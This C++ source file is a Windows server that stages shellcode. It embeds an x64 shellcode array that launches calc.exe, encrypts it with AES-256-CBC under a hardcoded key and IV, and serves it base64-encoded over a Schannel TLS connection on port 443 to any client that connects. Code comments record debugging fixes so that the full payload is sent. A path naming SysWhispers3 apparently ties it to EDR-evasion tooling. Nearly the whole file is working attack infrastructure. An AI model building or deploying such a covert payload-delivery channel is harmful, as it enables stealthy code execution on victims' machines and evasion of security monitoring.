// server.cpp
#define _CRT_SECURE_NO_WARNINGS
#define SECURITY_WIN32

#include <WinSock2.h>
#include <Windows.h>
#include <security.h>
#include <schannel.h>
#include <sspi.h>
#include <ws2tcpip.h>
#include <wincrypt.h>
#include <string>
#include <vector>
#include <cstdio>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "secur32.lib")
#pragma comment(lib, "crypt32.lib")

// ============================================================
// GLOBAL CERT STORE (MUST STAY OPEN FOR LIFETIME OF CRED HANDLE)
// ============================================================
static HCERTSTORE g_hStore = NULL;
static PCCERT_CONTEXT g_pCertContext = NULL;

// ============================================================
// PAYLOAD
// FIX: was std::string, which truncated at the first \x00 (offset 7).
// A char array keeps every byte; sizeof() gives the full length.
// ============================================================
static const char kShellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

// ============================================================
// LOAD PFX AND INITIALIZE SERVER CREDENTIALS
// ============================================================
CredHandle InitServerCredentials(const wchar_t* pfxPath, const wchar_t* password) {
    CredHandle hCred = { 0 };

    // Step 1: Open the PFX file
    HANDLE hFile = CreateFileW(pfxPath, GENERIC_READ, FILE_SHARE_READ, NULL,
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open PFX file (error: %d)\n", GetLastError());
        return hCred;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    std::vector<BYTE> pfxData(fileSize);
    DWORD bytesRead = 0;
    ReadFile(hFile, pfxData.data(), fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    printf("[+] Loaded PFX (%d bytes)\n", fileSize);

    // Step 2: Parse PFX into a certificate store
    CRYPT_DATA_BLOB pfxBlob = { 0 };
    pfxBlob.cbData = fileSize;
    pfxBlob.pbData = pfxData.data();

    g_hStore = PFXImportCertStore(&pfxBlob, password, 0);
    if (!g_hStore) {
        printf("[-] PFXImportCertStore failed: 0x%08X\n", GetLastError());
        return hCred;
    }

    // Step 3: Find the certificate in the store
    g_pCertContext = CertFindCertificateInStore(
        g_hStore,
        X509_ASN_ENCODING | PKCS_7_ASN_ENCODING,
        0,
        CERT_FIND_ANY,
        NULL,
        NULL
    );

    if (!g_pCertContext) {
        printf("[-] CertFindCertificateInStore failed\n");
        CertCloseStore(g_hStore, 0);
        g_hStore = NULL;
        return hCred;
    }

    printf("[+] Certificate loaded\n");

    // Step 4: Initialize SCHANNEL_CRED with the certificate
    SCHANNEL_CRED schCred = { 0 };
    schCred.dwVersion = SCHANNEL_CRED_VERSION;
    schCred.grbitEnabledProtocols = SP_PROT_TLS1_2_SERVER;  // TLS 1.2 only
    schCred.dwFlags = SCH_CRED_NO_DEFAULT_CREDS;
    schCred.cCreds = 1;
    schCred.paCred = &g_pCertContext;

    // Step 5: Acquire credentials handle
    TimeStamp ts;
    SECURITY_STATUS status = AcquireCredentialsHandleA(
        NULL,
        const_cast<LPSTR>(UNISP_NAME_A),
        SECPKG_CRED_INBOUND,
        NULL,
        &schCred,
        NULL,
        NULL,
        &hCred,
        &ts
    );

    if (status != SEC_E_OK) {
        printf("[-] AcquireCredentialsHandle failed: 0x%08X\n", status);
        CertFreeCertificateContext(g_pCertContext);
        CertCloseStore(g_hStore, 0);
        g_pCertContext = NULL;
        g_hStore = NULL;
    }
    else {
        printf("[+] Server credentials initialized\n");
    }

    // DO NOT free the cert or store here - they must stay alive
    return hCred;
}

// ============================================================
// ACCEPT SECURITY CONTEXT (SERVER HANDSHAKE LOOP)
// ============================================================
bool AcceptSecurityContextLoop(SOCKET clientSock, CredHandle hCred, CtxtHandle& hCtxt) {
    SecBuffer inBuffers[2];
    SecBuffer outBuffers[1];
    SecBufferDesc inDesc, outDesc;
    DWORD dwSSPIOutFlags = 0;
    TimeStamp ts;
    bool handshakeComplete = false;
    bool firstCall = true;

    std::vector<BYTE> accumBuffer;

    while (!handshakeComplete) {
        char rawBuffer[8192];
        int bytesRead = recv(clientSock, rawBuffer, sizeof(rawBuffer), 0);
        if (bytesRead <= 0) {
            printf("[-] recv failed or connection closed\n");
            return false;
        }

        accumBuffer.insert(accumBuffer.end(), rawBuffer, rawBuffer + bytesRead);

        inBuffers[0].BufferType = SECBUFFER_TOKEN;
        inBuffers[0].pvBuffer = accumBuffer.data();
        inBuffers[0].cbBuffer = (unsigned long)accumBuffer.size();
        inBuffers[1].BufferType = SECBUFFER_EMPTY;
        inBuffers[1].pvBuffer = NULL;
        inBuffers[1].cbBuffer = 0;

        inDesc.ulVersion = SECBUFFER_VERSION;
        inDesc.cBuffers = 2;
        inDesc.pBuffers = inBuffers;

        outBuffers[0].BufferType = SECBUFFER_TOKEN;
        outBuffers[0].pvBuffer = NULL;
        outBuffers[0].cbBuffer = 0;

        outDesc.ulVersion = SECBUFFER_VERSION;
        outDesc.cBuffers = 1;
        outDesc.pBuffers = outBuffers;

        SECURITY_STATUS status;

        if (firstCall) {
            status = AcceptSecurityContext(
                &hCred,
                NULL,
                &inDesc,
                ASC_REQ_SEQUENCE_DETECT | ASC_REQ_REPLAY_DETECT |
                ASC_REQ_CONFIDENTIALITY | ASC_REQ_STREAM |
                ASC_REQ_ALLOCATE_MEMORY,
                0,
                &hCtxt,
                &outDesc,
                &dwSSPIOutFlags,
                &ts
            );
            firstCall = false;
        }
        else {
            status = AcceptSecurityContext(
                &hCred,
                &hCtxt,
                &inDesc,
                ASC_REQ_SEQUENCE_DETECT | ASC_REQ_REPLAY_DETECT |
                ASC_REQ_CONFIDENTIALITY | ASC_REQ_STREAM |
                ASC_REQ_ALLOCATE_MEMORY,
                0,
                NULL,
                &outDesc,
                &dwSSPIOutFlags,
                &ts
            );
        }

        if (outBuffers[0].cbBuffer && outBuffers[0].pvBuffer) {
            send(clientSock, (const char*)outBuffers[0].pvBuffer, outBuffers[0].cbBuffer, 0);
            FreeContextBuffer(outBuffers[0].pvBuffer);
        }

        if (status == SEC_E_OK) {
            printf("[+] Server handshake complete\n");
            handshakeComplete = true;

            if (inBuffers[1].BufferType == SECBUFFER_EXTRA && inBuffers[1].cbBuffer > 0) {
                printf("[*] Extra data after handshake: %d bytes\n", inBuffers[1].cbBuffer);
            }
        }
        else if (status == SEC_I_CONTINUE_NEEDED) {
            printf("[*] Server handshake in progress...\n");

            if (inBuffers[1].BufferType == SECBUFFER_EXTRA && inBuffers[1].cbBuffer > 0) {
                size_t extraSize = inBuffers[1].cbBuffer;
                memmove(accumBuffer.data(),
                    accumBuffer.data() + (accumBuffer.size() - extraSize),
                    extraSize);
                accumBuffer.resize(extraSize);
            }
            else {
                accumBuffer.clear();
            }
            continue;
        }
        else if (status == SEC_E_INCOMPLETE_MESSAGE) {
            printf("[*] Incomplete message, reading more...\n");
            continue;
        }
        else {
            printf("[-] AcceptSecurityContext failed: 0x%08X\n", status);
            return false;
        }
    }
    return true;
}

// ============================================================
// SEND ENCRYPTED DATA (SERVER)
// ============================================================
bool SendEncrypted(CtxtHandle& hCtxt, SOCKET sock, const std::vector<BYTE>& data) {
    SecPkgContext_StreamSizes sizes;
    if (QueryContextAttributesA(&hCtxt, SECPKG_ATTR_STREAM_SIZES, &sizes) != SEC_E_OK) {
        return false;
    }

    std::vector<BYTE> buffer(sizes.cbHeader + data.size() + sizes.cbTrailer);
    memcpy(buffer.data() + sizes.cbHeader, data.data(), data.size());

    SecBuffer buffers[3];
    buffers[0].BufferType = SECBUFFER_STREAM_HEADER;
    buffers[0].pvBuffer = buffer.data();
    buffers[0].cbBuffer = sizes.cbHeader;
    buffers[1].BufferType = SECBUFFER_DATA;
    buffers[1].pvBuffer = buffer.data() + sizes.cbHeader;
    buffers[1].cbBuffer = (unsigned long)data.size();
    buffers[2].BufferType = SECBUFFER_STREAM_TRAILER;
    buffers[2].pvBuffer = buffer.data() + sizes.cbHeader + data.size();
    buffers[2].cbBuffer = sizes.cbTrailer;

    SecBufferDesc desc;
    desc.ulVersion = SECBUFFER_VERSION;
    desc.cBuffers = 3;
    desc.pBuffers = buffers;

    if (EncryptMessage(&hCtxt, 0, &desc, 0) != SEC_E_OK) {
        return false;
    }

    int total = buffers[0].cbBuffer + buffers[1].cbBuffer + buffers[2].cbBuffer;
    int sent = 0;
    while (sent < total) {
        int ret = send(sock, (const char*)buffer.data() + sent, total - sent, 0);
        if (ret <= 0) return false;
        sent += ret;
    }
    return true;
}

// ============================================================
// AES-256-CBC ENCRYPTION (application-layer, before TLS)
// ============================================================
static const std::vector<BYTE> g_key = {
    0x3a, 0x7f, 0x1c, 0x9e, 0x42, 0x8b, 0xd5, 0x60,
    0x2f, 0xa1, 0xcb, 0x73, 0x18, 0xe4, 0x96, 0x0d,
    0x55, 0x8c, 0x21, 0xba, 0xf3, 0x6e, 0x47, 0x9a,
    0x30, 0xc2, 0x7d, 0x1b, 0xa8, 0x54, 0xe9, 0x62
};

// FIX: IV restored to a full 16-byte block (0xe5 back on the end).
static const std::vector<BYTE> g_iv = {
    0x91, 0x4d, 0x2a, 0xf8, 0x03, 0xc7, 0x6e, 0x5b,
    0x80, 0x19, 0xd4, 0x37, 0xab, 0x62, 0x0f, 0xe5
};

// Small debug aid: hex-dump the head of a buffer so truncation is visible.
static void DumpHead(const char* label, const std::vector<BYTE>& v, size_t n) {
    printf("[*] %s (%zu shown): ", label, n);
    for (size_t i = 0; i < n && i < v.size(); i++) printf("%02x ", v[i]);
    printf("\n");
}

std::vector<BYTE> Aes256Encrypt(const std::vector<BYTE>& plaintext) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY  hKey = 0;

    if (plaintext.empty()) return {};

    if (!CryptAcquireContextW(&hProv, NULL, MS_ENH_RSA_AES_PROV_W,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("[-] CryptAcquireContext failed: %d\n", GetLastError());
        return {};
    }

    struct Aes256KeyBlob {
        BLOBHEADER hdr;
        DWORD      keySize;
        BYTE       keyData[32];
    } blob = {};

    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_256;
    blob.keySize = 32;
    memcpy(blob.keyData, g_key.data(), 32);

    if (!CryptImportKey(hProv, reinterpret_cast<BYTE*>(&blob),
        sizeof(blob), 0, 0, &hKey)) {
        printf("[-] CryptImportKey failed: %d\n", GetLastError());
        CryptReleaseContext(hProv, 0);
        return {};
    }

    DWORD mode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, reinterpret_cast<BYTE*>(&mode), 0);
    if (!CryptSetKeyParam(hKey, KP_IV, const_cast<BYTE*>(g_iv.data()), 0)) {
        printf("[-] CryptSetKeyParam(KP_IV) failed: %d\n", GetLastError());
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return {};
    }

    DWORD dataLen = static_cast<DWORD>(plaintext.size());
    DWORD bufLen = dataLen + 16; // room for PKCS#7 padding
    std::vector<BYTE> buffer(bufLen, 0);
    memcpy(buffer.data(), plaintext.data(), plaintext.size());

    if (!CryptEncrypt(hKey, 0, TRUE, 0, buffer.data(), &dataLen, bufLen)) {
        printf("[-] CryptEncrypt failed: %d\n", GetLastError());
        buffer.clear();
    }
    else {
        buffer.resize(dataLen);
    }

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return buffer;
}

std::string Base64Encode(const std::vector<BYTE>& data) {
    DWORD outLen = 0;
    if (!CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        NULL, &outLen)) {
        printf("[-] Base64 size query failed: %d\n", GetLastError());
        return {};
    }
    std::string out(outLen, '\0'); // FIX: allocate full size incl. terminator
    if (!CryptBinaryToStringA(data.data(), static_cast<DWORD>(data.size()),
        CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
        &out[0], &outLen)) {
        printf("[-] Base64 encode failed: %d\n", GetLastError());
        return {};
    }
    // FIX: trim trailing nulls explicitly instead of assuming outLen semantics
    while (!out.empty() && out.back() == '\0') out.pop_back();
    return out;
}

// ============================================================
// MAIN (SERVER)
// ============================================================
int main() {
    // FIX: fail fast if key/IV sizes are ever wrong again
    if (g_key.size() != 32 || g_iv.size() != 16) {
        printf("[-] Bad key/IV size (key=%zu, iv=%zu). Aborting.\n",
            g_key.size(), g_iv.size());
        return 1;
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("[-] WSAStartup failed\n");
        return 1;
    }

    SOCKET listenSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listenSock == INVALID_SOCKET) {
        printf("[-] socket failed\n");
        WSACleanup();
        return 1;
    }

    BOOL opt = TRUE;
    setsockopt(listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&opt, sizeof(opt));

    sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    addr.sin_addr.s_addr = INADDR_ANY;

    if (bind(listenSock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        printf("[-] bind failed: %d\n", WSAGetLastError());
        closesocket(listenSock);
        WSACleanup();
        return 1;
    }

    if (listen(listenSock, SOMAXCONN) == SOCKET_ERROR) {
        printf("[-] listen failed: %d\n", WSAGetLastError());
        closesocket(listenSock);
        WSACleanup();
        return 1;
    }

    printf("[*] Server listening on port 443\n");

    CredHandle hCred = InitServerCredentials(
        L"C:\\Users\\maste\\SysWhispers3\\server.pfx",
        L""  // Empty password
    );

    if (hCred.dwLower == 0 && hCred.dwUpper == 0) {
        printf("[-] Failed to initialize credentials\n");
        closesocket(listenSock);
        WSACleanup();
        return 1;
    }

    while (true) {
        SOCKET clientSock = accept(listenSock, NULL, NULL);
        if (clientSock == INVALID_SOCKET) {
            printf("[-] accept failed: %d\n", WSAGetLastError());
            continue;
        }

        printf("[+] Client connected\n");

        CtxtHandle hCtxt = { 0 };
        if (AcceptSecurityContextLoop(clientSock, hCred, hCtxt)) {
            // FIX: build the byte vector from the char ARRAY.
            // sizeof() includes the implicit string terminator, so subtract 1.
            // The payload itself ends in an explicit \x00 after "calc.exe",
            // which is part of the shellcode and is preserved.
            const BYTE* p = reinterpret_cast<const BYTE*>(kShellcode);
            std::vector<BYTE> plainBytes(p, p + sizeof(kShellcode) - 1);

            printf("[*] Payload plaintext: %zu bytes (should be ~276, not 7)\n",
                plainBytes.size());
            DumpHead("plaintext[0..15]", plainBytes, 16);

            std::vector<BYTE> ciphertext = Aes256Encrypt(plainBytes);
            std::string encryptedB64 = Base64Encode(ciphertext);

            if (ciphertext.empty() && !plainBytes.empty()) {
                printf("[-] AES encryption failed, skipping client\n");
                closesocket(clientSock);
                continue;
            }
            printf("[*] AES-256 ciphertext: %zu bytes, base64: %zu chars\n",
                ciphertext.size(), encryptedB64.size());

            std::vector<BYTE> full(encryptedB64.begin(), encryptedB64.end());

            if (SendEncrypted(hCtxt, clientSock, full)) {
                printf("[+] Payload sent (%zu bytes)\n", full.size());
            }
            else {
                printf("[-] Failed to send payload\n");
            }

            DeleteSecurityContext(&hCtxt);
        }
        else {
            printf("[-] Handshake failed\n");
        }

        closesocket(clientSock);
        printf("[*] Connection closed, waiting for next client...\n\n");
    }

    FreeCredentialsHandle(&hCred);
    if (g_pCertContext) CertFreeCertificateContext(g_pCertContext);
    if (g_hStore) CertCloseStore(g_hStore, 0);
    closesocket(listenSock);
    WSACleanup();
    return 0;
}